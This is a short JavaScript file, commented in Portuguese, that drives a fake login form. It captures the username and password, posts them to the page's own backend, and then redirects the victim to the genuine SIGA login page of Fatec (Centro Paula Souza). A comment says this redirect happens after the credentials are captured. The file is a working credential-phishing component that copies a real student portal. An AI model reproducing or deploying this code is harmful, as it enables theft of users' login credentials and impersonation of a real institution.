document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("login-form");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = form.elements["username"].value.trim();
    const password = form.elements["password"].value.trim();

    // Validação: se algum campo vazio, não envia nada
    if (!username || !password) {
      return;
    }

    try {
      // URL relativa - funciona automaticamente na mesma porta do backend
      const response = await fetch("/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: username,
          password: password,
        }),
      });

      if (response.ok) {
        console.log("Credenciais enviadas.");
        // Redireciona diretamente para o site real após capturar as credenciais
        window.location.href = "https://siga.cps.sp.gov.br/fatec/login.aspx";
      } else {
        alert("Erro ao enviar dados.");
      }
    } catch (err) {
      console.error("Erro na requisição:", err);
      alert("Falha na comunicação com o servidor.");
    }
  });
});
